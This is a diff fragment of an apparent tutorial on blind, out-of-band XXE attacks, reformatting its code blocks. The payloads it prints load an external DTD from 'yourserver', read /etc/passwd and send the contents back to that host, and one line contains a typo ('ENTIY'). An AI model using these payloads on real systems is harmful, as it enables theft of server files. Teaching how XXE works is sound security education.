@@ -37,15 +37,11 @@ The xml parser will process this payload as same as above but instead of request
 Still you can confirm the existence of the vulnerability by using the first payload above. But you can't see the file contents of local files of webserver. This is still an issue but now the severity is a ***little bit low.*** And, this is called Blind XXE OR Out-of-band XXE.
 
 So we also needed to blind means we have to use blind payload.
-`
-<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % test SYSTEM 'http://yourserver/xml.dtd'> %test; %exe]><root>&entity;</root>
-`
+`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % test SYSTEM 'http://yourserver/xml.dtd'> %test; %exe]><root>&entity;</root>`
 Your xml.dtd contents:- 
 
-`
- <!ENTITY % file SYSTEM "file:///etc/passwd">
- <!ENTIY % exe "<!ENTITY entity SYSTEM 'http://yourserver/%file;'>">
-`
+`<!ENTITY % file SYSTEM "file:///etc/passwd">`
+`<!ENTIY % exe "<!ENTITY entity SYSTEM 'http://yourserver/%file;'>">`
 
 Lot's of code to understand:-
 
